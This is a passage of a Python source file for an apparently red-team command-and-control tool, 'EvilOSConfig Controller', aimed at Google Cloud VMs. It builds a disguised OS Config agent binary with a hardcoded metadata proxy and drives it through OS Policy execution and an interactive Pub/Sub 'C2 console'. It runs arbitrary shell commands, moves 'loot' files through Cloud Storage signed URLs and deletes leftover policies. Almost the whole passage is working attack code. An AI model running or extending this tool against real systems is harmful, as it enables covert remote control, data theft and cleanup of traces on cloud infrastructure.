        print("[+] Pub/Sub enabled. Agent will pick up the change within seconds.")
    else:
        print(f"[!] Failed to enable: {result.stderr}", file=sys.stderr)


def cmd_disable_pubsub(args):
    zone = args.zone
    instance = args.proxy_instance
    project = get_project(args.project)
    print(f"[*] Disabling Pub/Sub on {instance} ({zone})...")
    result = subprocess.run([
        "gcloud", "compute", "instances", "add-metadata", instance,
        "--project", project, "--zone", zone,
        "--metadata", "enable-pubsub=false", "--quiet"
    ], capture_output=True, text=True)
    if result.returncode == 0:
        print("[+] Pub/Sub disabled.")
    else:
        print(f"[!] Failed: {result.stderr}", file=sys.stderr)


def _pubsub_post_json(url, token, body, timeout):
    req = urllib.request.Request(url, data=json.dumps(body).encode(), method="POST")
    req.add_header("Authorization", f"Bearer {token}")
    req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            payload = resp.read()
    except urllib.error.HTTPError as e:
        detail = e.read().decode("utf-8", errors="replace")
        raise RuntimeError(f"Pub/Sub HTTP {e.code}: {detail}") from e
    except (TimeoutError, urllib.error.URLError) as e:
        raise RuntimeError(f"Pub/Sub request failed: {e}") from e

    return json.loads(payload) if payload else {}


def pubsub_publish(project, topic, data, token, attributes=None):
    url = f"https://pubsub.googleapis.com/v1/projects/{project}/topics/{topic}:publish"
    message = {"data": base64.b64encode(data.encode()).decode()}
    if attributes:
        message["attributes"] = {str(k): str(v) for k, v in attributes.items()}
    response = _pubsub_post_json(url, token, {"messages": [message]}, timeout=10)
    message_ids = response.get("messageIds", [])
    if not message_ids:
        raise RuntimeError("Pub/Sub publish returned no message ID")
    return message_ids[0]


def decode_pubsub_output(message, output_encoding="auto"):
    try:
        raw = base64.b64decode(message.get("data", ""), validate=True)
    except (binascii.Error, ValueError) as e:
        raise ValueError(f"invalid Pub/Sub output data: {e}") from e

    attributes = message.get("attributes", {})
    encoding_hint = attributes.get("encoding", "").strip()
    if output_encoding != "auto":
        candidates = [output_encoding]
    elif encoding_hint:
        candidates = [encoding_hint, "utf-8"]
    else:
        # Legacy Windows agents published raw OEM bytes without an encoding
        # attribute. CP949 covers the Korean Windows image used by the demo;
        # CP1252 is a safe final legacy fallback for Western Windows images.
        candidates = ["utf-8", "cp949", "cp1252"]

    tried = set()
    for encoding in candidates:
        normalized = encoding.lower()
        if normalized in tried:
            continue
        tried.add(normalized)
        try:
            return raw.decode(encoding), encoding
        except (LookupError, UnicodeDecodeError):
            continue

    fallback = candidates[0] if candidates else "utf-8"
    try:
        return raw.decode(fallback, errors="replace"), fallback
    except LookupError:
        return raw.decode("utf-8", errors="replace"), "utf-8"


def _parse_publish_time(message):
    value = message.get("publishTime")
    if not value:
        return None
    try:
        return datetime.fromisoformat(value.replace("Z", "+00:00"))
    except ValueError:
        return None


def _classify_pubsub_output(message, request_id, published_after):
    attributes = message.get("attributes", {})
    response_id = attributes.get("request_id")
    if response_id:
        return "match" if response_id == request_id else "other"

    # Backward compatibility for already-deployed agents that do not echo the
    # request ID. Ignore backlog that predates this command.
    publish_time = _parse_publish_time(message)
    if publish_time and published_after:
        earliest = published_after.timestamp() - PUBSUB_LEGACY_CLOCK_SKEW
        if publish_time.timestamp() < earliest:
            return "stale"
    return "legacy"


def _pubsub_ack(project, subscription, token, ack_ids):
    if not ack_ids:
        return
    url = f"https://pubsub.googleapis.com/v1/projects/{project}/subscriptions/{subscription}:acknowledge"
    _pubsub_post_json(url, token, {"ackIds": ack_ids}, timeout=10)


def _pubsub_nack(project, subscription, token, ack_ids):
    if not ack_ids:
        return
    url = f"https://pubsub.googleapis.com/v1/projects/{project}/subscriptions/{subscription}:modifyAckDeadline"
    _pubsub_post_json(url, token, {"ackIds": ack_ids, "ackDeadlineSeconds": 0}, timeout=10)


def configure_pubsub_console_history():
    if console_readline is None:
        return False

    # Keep history in memory only. Explicit bindings make the behavior clear
    # even when a user's inputrc has changed the default arrow-key mappings.
    try:
        console_readline.parse_and_bind('"\\e[A": previous-history')
        console_readline.parse_and_bind('"\\e[B": next-history')
    except (AttributeError, RuntimeError):
        return False
    return True


def pubsub_pull(project, subscription, token, timeout=30, request_id=None,
                published_after=None, output_encoding="auto"):
    url = f"https://pubsub.googleapis.com/v1/projects/{project}/subscriptions/{subscription}:pull"
    body = {"maxMessages": 10}
    deadline = time.monotonic() + timeout
    results = []
    while time.monotonic() < deadline:
        remaining = deadline - time.monotonic()
        try:
            # REST Pull is a bounded long poll. Give that single request enough
            # time to finish instead of abandoning one every ten seconds and
            # stranding leased messages until their ack deadline expires.
            data = _pubsub_post_json(
                url,
                token,
                body,
                timeout=max(1, remaining) + PUBSUB_PULL_TIMEOUT_GRACE,
            )
        except RuntimeError as e:
            print(f"[!] {e}", file=sys.stderr)
            return results

        received = data.get("receivedMessages", [])
        if not received:
            time.sleep(min(0.5, max(0, deadline - time.monotonic())))
            continue

        ack_ids = []
        nack_ids = []
        stale_count = 0
        for received_message in received:
            ack_id = received_message.get("ackId")
            message = received_message.get("message", {})
            classification = _classify_pubsub_output(
                message, request_id, published_after
            )
            if classification == "other":
                if ack_id:
                    nack_ids.append(ack_id)
                continue
            if classification == "stale":
                stale_count += 1
                if ack_id:
                    ack_ids.append(ack_id)
                continue

            try:
                output, _ = decode_pubsub_output(message, output_encoding)
            except ValueError as e:
                print(f"[!] Pub/Sub output decode failed: {e}", file=sys.stderr)
                if ack_id:
                    nack_ids.append(ack_id)
                continue

            results.append(output)
            if ack_id:
                ack_ids.append(ack_id)

        # Acknowledge only after the message has been classified and decoded.
        _pubsub_ack(project, subscription, token, ack_ids)
        _pubsub_nack(project, subscription, token, nack_ids)
        if stale_count:
            print(f"[~] Discarded {stale_count} stale output message(s).", file=sys.stderr)
        if results:
            return results
    return results


def cmd_pubsub(args):
    project = get_project(args.project)
    token = get_token()
    timeout = args.timeout
    history_enabled = configure_pubsub_console_history()

    print(f"[*] Pub/Sub C2 console — project: {project}")
    print(f"[*] Cmd topic: {PUBSUB_CMD_TOPIC}, Output sub: {PUBSUB_OUTPUT_SUB}")
    if history_enabled:
        print("[*] Command history: Up/Down arrows")
    print("[*] Type commands. Ctrl+C to exit.\n")

    while True:
        try:
            cmd = input("evilosconfig> ")
            if not cmd.strip():
                continue

            token = get_token()
            request_id = uuid.uuid4().hex
            published_after = datetime.now(timezone.utc)
            pubsub_publish(
                project,
                PUBSUB_CMD_TOPIC,
                cmd,
                token,
                attributes={"request_id": request_id},
            )

            results = pubsub_pull(
                project,
                PUBSUB_OUTPUT_SUB,
                token,
                timeout=timeout,
                request_id=request_id,
                published_after=published_after,
                output_encoding=args.output_encoding,
            )
            if results:
                for r in results:
                    print(r)
            else:
                print("[!] No output received (timeout)", file=sys.stderr)
        except KeyboardInterrupt:
            print("\n[*] Exiting.")
            break
        except EOFError:
            break
        except RuntimeError as e:
            print(f"[!] {e}", file=sys.stderr)


# ── drain ─────────────────────────────────────────────────────────────

def _list_evilosconfig_policies(zone, project, instance_id=None):
    cmd = [
        "gcloud", "compute", "os-config", "os-policy-assignments", "list",
        "--location", zone, "--project", project, "--format", "json(name,rolloutState)",
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    policies = [p for p in json.loads(result.stdout or "[]")
                if "evilosconfig" in p.get("name", "")]
    if not instance_id:
        return policies

    token = get_token()
    if not token:
        return policies

    filtered = []
    for p in policies:
        pid = p["name"].rsplit("/", 1)[-1]
        report_url = (
            f"https://osconfig.googleapis.com/v1/projects/{project}"
            f"/locations/{zone}/instances/{instance_id}"
            f"/osPolicyAssignments/{pid}/report"
        )
        req = urllib.request.Request(report_url)
        req.add_header("Authorization", f"Bearer {token}")
        try:
            urllib.request.urlopen(req, timeout=5)
            filtered.append(p)
        except Exception:
            continue
    return filtered


def cmd_drain(args):
    project = get_project(args.project)
    zone = args.zone
    instance_id = getattr(args, "instance_id", None)

    label = f"instance {instance_id}" if instance_id else zone
    print(f"[*] Draining stale OS Policies for {label}...")

    deadline = time.time() + args.timeout
    while time.time() < deadline:
        policies = _list_evilosconfig_policies(zone, project, instance_id)

        in_progress = [p for p in policies if p.get("rolloutState") == "IN_PROGRESS"]

        if not policies:
            print("[+] No evilosconfig policies found. Clean.")
            return

        if not in_progress:
            break

        names = [p["name"].rsplit("/", 1)[-1] for p in in_progress]
        print(f"[*] Waiting on {len(in_progress)} IN_PROGRESS: {', '.join(names)}")
        time.sleep(args.poll_interval)

    policies = _list_evilosconfig_policies(zone, project, instance_id)

    deleted = 0
    stuck = 0
    for p in policies:
        pid = p["name"].rsplit("/", 1)[-1]
        if p.get("rolloutState") == "IN_PROGRESS":
            print(f"    [!] Still stuck: {pid}")
            stuck += 1
            continue
        dr = subprocess.run(
            ["gcloud", "compute", "os-config", "os-policy-assignments", "delete",
             pid, "--location", zone, "--project", project, "--quiet", "--async"],
            capture_output=True, text=True,
        )
        if dr.returncode == 0:
            deleted += 1
        else:
            print(f"    [!] Failed to delete {pid}: {dr.stderr.strip()}")

    print(f"[+] Deleted {deleted} policies.", end="")
    if stuck:
        print(f" {stuck} still IN_PROGRESS (agent must be running to clear them).", end="")
    print()


# ── main ──────────────────────────────────────────────────────────────

def main():
    # Shared parent for subcommands that target a GCE instance
    gce_parent = argparse.ArgumentParser(add_help=False)
    gce_parent.add_argument('--proxy-instance', default=None,
                            help=f'GCE proxy instance name (default: config or {DEFAULT_PROXY_INSTANCE})')
    gce_parent.add_argument('-z', '--zone', default=None,
                            help=f'GCE zone (default: config or {DEFAULT_ZONE})')
    config_parent = argparse.ArgumentParser(add_help=False)
    config_parent.add_argument('--config', default=argparse.SUPPRESS,
                               help=f'Controller JSON config file (default: {DEFAULT_CONFIG_FILE})')

    parser = argparse.ArgumentParser(
        description='EvilOSConfig Controller',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
        examples:
          %(prog)s bake 34.56.78.90:8080
          %(prog)s compile --trim --with-pubsub -o agent
          %(prog)s runcmd -z asia-northeast3-a 7767983064088376498 "id && hostname"
          %(prog)s runcmd --dry-run 7767983064088376498 "id && hostname"
          %(prog)s upload --target local ./loot.txt /my-bucket/stage/
          %(prog)s upload --target agent /tmp/loot.txt /my-bucket/stage/loot.txt
          %(prog)s download --target local /my-bucket/stage/loot.txt ./loot.txt
          %(prog)s download --target agent /my-bucket/stage/loot.txt /tmp/
          %(prog)s --project my-project runcmd 7767983064088376498 "whoami"
          %(prog)s enable-pubsub
          %(prog)s pubsub-console
          %(prog)s unbake
        """)
    )
    parser.add_argument('--project', default=None,
                        help='GCP project ID (default: current gcloud config)')
    parser.add_argument('--config', default=DEFAULT_CONFIG_FILE,
                        help=f'Controller JSON config file (default: {DEFAULT_CONFIG_FILE})')
    sub = parser.add_subparsers(dest='command', required=True)

    # bake
    bake = sub.add_parser('bake', help='Hardcode metadata proxy address into agent source')
    bake.add_argument('proxy_host', help='Metadata proxy address (e.g., 34.56.78.90:8080)')
    bake.set_defaults(func=cmd_bake)

    # unbake
    unbake = sub.add_parser('unbake', help='Restore original env-var-based metadata host')
    unbake.set_defaults(func=cmd_unbake)

    # compile
    comp = sub.add_parser('compile', help='Build the agent binary')
    comp.add_argument('-o', '--output', default='google_osconfig_agent', help='Output binary name')
    comp.add_argument('--trim', action='store_true', help='Remove heavy deps (scalibr, sqlite) for smaller binary')
    comp.add_argument('--ldflags', default='', help='Go ldflags (default: none)')
    comp.add_argument('--trimpath', action='store_true', default=True,
                       help='Strip absolute source paths from binary (default: enabled)')
    comp.add_argument('--with-pubsub', action='store_true', help='Compile with Pub/Sub C2 module')
    comp.set_defaults(func=cmd_compile)

    # list
    ls = sub.add_parser('list', parents=[gce_parent, config_parent],
                        help='List registered OS Config agents')
    ls.set_defaults(func=cmd_list)

    # runcmd
    run = sub.add_parser('runcmd', parents=[config_parent],
                         help='Send a command via OS Policy ExecResource')
    run.add_argument('-z', '--zone', default=None,
                     help=f'GCE zone (default: config or {DEFAULT_ZONE})')
    run.add_argument('instance_id', help='GCE instance ID whose compliance report will be read')
    run.add_argument('command', help='Shell command to execute')
    run.add_argument('--timeout', type=int, default=None, help=f'Timeout in seconds (default: config or {DEFAULT_TIMEOUT})')
    run.add_argument('--poll-interval', type=int, default=None,
                     help=f'Poll interval in seconds (default: config or {DEFAULT_POLL_INTERVAL})')
    run.add_argument('--no-cleanup', action='store_true', help='Do not delete the OS Policy after execution')
    run.add_argument('--dry-run', action='store_true', help='Print the OS Policy YAML without deploying')
    run.add_argument('--os', choices=['linux', 'windows'], default='linux',
                     help='Target OS: linux uses /bin/sh, windows uses PowerShell with UTF-8 (default: linux)')
    run.set_defaults(func=cmd_runcmd)

    # upload
    upload = sub.add_parser('upload', parents=[gce_parent, config_parent],
                            help='Upload a local or agent file to Cloud Storage via signed URL')
    upload.add_argument('--target', choices=['local', 'agent'], required=True,
                        help='Upload from the local controller host or from the agent host')
    upload.add_argument('--duration', default=None, help=f'Signed URL duration (default: config or {DEFAULT_DURATION})')
    upload.add_argument('--timeout', type=int, default=None,
                        help=f'Agent execution timeout in seconds (default: config or {DEFAULT_TIMEOUT})')
    upload.add_argument('--poll-interval', type=int, default=None,
                        help=f'Agent poll interval in seconds (default: config or {DEFAULT_POLL_INTERVAL})')
    upload.add_argument('--no-cleanup', action='store_true', help='Do not delete the OS Policy after agent execution')
    upload.add_argument('--dry-run', action='store_true', help='Print the agent OS Policy YAML without deploying')
    upload.add_argument('src_file', help='Source file path on local or agent host')
    upload.add_argument('storage_path', help='Destination /bucket/object or /bucket/prefix/')
    upload.set_defaults(func=cmd_upload)

    # download
    download = sub.add_parser('download', parents=[gce_parent, config_parent],
                              help='Download a Cloud Storage object via signed URL')
    download.add_argument('--target', choices=['local', 'agent'], required=True,
                          help='Download to the local controller host or to the agent host')
    download.add_argument('--duration', default=None, help=f'Signed URL duration (default: config or {DEFAULT_DURATION})')
    download.add_argument('--timeout', type=int, default=None,
                          help=f'Agent execution timeout in seconds (default: config or {DEFAULT_TIMEOUT})')
    download.add_argument('--poll-interval', type=int, default=None,
                          help=f'Agent poll interval in seconds (default: config or {DEFAULT_POLL_INTERVAL})')
    download.add_argument('--no-cleanup', action='store_true', help='Do not delete the OS Policy after agent execution')
    download.add_argument('--dry-run', action='store_true', help='Print the agent OS Policy YAML without deploying')
    download.add_argument('storage_path', help='Source /bucket/object')
    download.add_argument('dst_path', help='Destination directory or file path on local or agent host')
    download.set_defaults(func=cmd_download)

    # enable-pubsub
    ep = sub.add_parser('enable-pubsub', parents=[gce_parent, config_parent],
                        help='Ensure Pub/Sub infrastructure/IAM and enable on the agent')
    ep.set_defaults(func=cmd_enable_pubsub)

    # disable-pubsub
    dp = sub.add_parser('disable-pubsub', parents=[gce_parent, config_parent],
                        help='Disable Pub/Sub C2 on the agent via metadata')
    dp.set_defaults(func=cmd_disable_pubsub)

    # pubsub-console (interactive C2 console)
    ps = sub.add_parser('pubsub-console', help='Interactive Pub/Sub C2 console with command history')
    ps.add_argument('--timeout', type=int, default=30, help='Output wait timeout in seconds (default: 30)')
    ps.add_argument('--output-encoding', default='auto',
                    help='Output encoding or auto for UTF-8/legacy Windows detection (default: auto)')
    ps.set_defaults(func=cmd_pubsub)

    # drain
    dr = sub.add_parser('drain', parents=[gce_parent, config_parent],
                        help='Wait for stale OS Policies to complete, then delete them')
    dr.add_argument('instance_id', nargs='?', default=None,
                    help='GCE instance ID to drain (optional — drains all if omitted)')
    dr.add_argument('--timeout', type=int, default=120, help='Max wait time in seconds (default: 120)')
    dr.add_argument('--poll-interval', type=int, default=10, help='Poll interval in seconds (default: 10)')
    dr.set_defaults(func=cmd_drain)

    args = apply_controller_config(parser.parse_args())
    args.func(args)


if __name__ == '__main__':
    main()
